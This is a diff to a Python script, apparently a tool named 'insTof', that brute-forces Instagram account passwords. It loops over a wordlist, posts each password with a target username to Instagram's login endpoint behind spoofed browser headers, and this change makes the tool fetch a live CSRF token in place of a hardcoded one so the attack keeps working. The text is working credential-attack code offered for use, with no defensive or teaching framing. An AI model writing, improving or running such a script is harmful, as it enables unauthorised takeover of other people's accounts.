@@ -23,7 +23,7 @@ print(detect_color+'''
                             "F3  $r
                            $$$$.e$"  .
                            "$$$$$"   "
-     (insTof by 8.1v)        $$$$c  /
+     (insTof by 8.2v)        $$$$c  /
         .                   $$$$$$$P
        ."c                      $$$
       .$c3b                  ..J$$$$$e
@@ -52,9 +52,9 @@ windows = 'cls'
 password = open(flo).read().splitlines()
 for password in password:
         login_url = 'https://www.instagram.com/accounts/login/ajax/'
-
+        link = 'https://www.instagram.com/accounts/login/'
         time = int(datetime.now().timestamp())
-
+        req = s.get(link)
         payload = {
             'username': user,
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
@@ -67,7 +67,7 @@ for password in password:
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
                 "Referer": "https://www.instagram.com/accounts/login/",
-                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
+                "x-csrftoken": req.cookies['csrftoken'] 
             })
         for i in range(2):
             if i ==1:
